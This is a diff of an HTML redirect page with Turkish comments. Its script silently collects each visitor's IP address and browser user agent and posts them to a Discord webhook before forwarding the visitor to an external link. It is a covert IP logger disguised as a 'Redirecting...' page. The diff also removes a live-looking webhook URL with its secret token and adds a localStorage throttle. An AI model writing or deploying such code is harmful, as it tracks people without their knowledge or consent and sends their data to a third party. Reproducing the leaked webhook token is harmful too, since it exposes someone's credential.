@@ -5,45 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        async function sendIP() {
+        (async function() {
             try {
-                // IP Adresini almak için harici bir API kullan (GitHub Pages destekli)
+                // IP Adresini almak için harici API
                 let response = await fetch("https://api64.ipify.org?format=json");
                 let data = await response.json();
                 let ip = data.ip;
 
-                // Kullanıcının tarayıcı bilgilerini al
+                // Tarayıcı bilgilerini al
                 let userAgent = navigator.userAgent;
+
+                // DDoS Koruması - Aynı IP'den sık girişleri engelle
+                let lastVisit = localStorage.getItem("lastVisit");
+                let now = Date.now();
+
+                if (lastVisit && now - lastVisit < 5000) { // 5 saniyede 1 giriş izni
+                    window.location.href = "https://you.fck.ink/-/";
+                    return;
+                }
+
+                // Son ziyareti kaydet
+                localStorage.setItem("lastVisit", now);
+
+                // Discord Webhook URL'nizi buraya ekleyin
+                let webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
 
                 // Webhook'a gönderilecek veri
                 let payload = {
                     content: `**Yeni ziyaretçi tespit edildi!**\n🔹 IP Adresi: ${ip}\n🖥 Tarayıcı: ${userAgent}`
                 };
 
-                // Discord Webhook URL'nizi buraya ekleyin
-                let webhookURL = "https://discord.com/api/webhooks/1343185410762866779/cjRXLMLbEJjwjaGCkfdgfEBchGaBixZn7EfBfqoHANKBZDiBKMHtAN9b1QRz7JeLAvTB";
-
-                // Webhook'a isteği gönder
-                await fetch(webhookURL, {
+                // IP bilgisini Discord Webhook'a gönder
+                fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                // Kullanıcıyı yönlendir
-                setTimeout(() => {
-                    window.location.href = "https://you.fck.ink/-/";
-                }, 2000); // 2 saniye bekle, sonra yönlendir
             } catch (error) {
                 console.error("IP adresi gönderilemedi:", error);
             }
-        }
 
-        // Sayfa yüklendiğinde çalıştır
-        window.onload = sendIP;
+            // Kullanıcıyı hemen yönlendir
+            window.location.href = "https://you.fck.ink/-/";
+        })();
     </script>
 </head>
 <body>
-    <p>Redirecting... If you stay here, <a href="https://you.fck.ink/-/">click for redirect.</a>.</p>
+    <p>Redirecting... Eğer otomatik yönlendirilmezseniz, <a href="https://you.fck.ink/-/">buraya tıklayın</a>.</p>
 </body>
 </html>
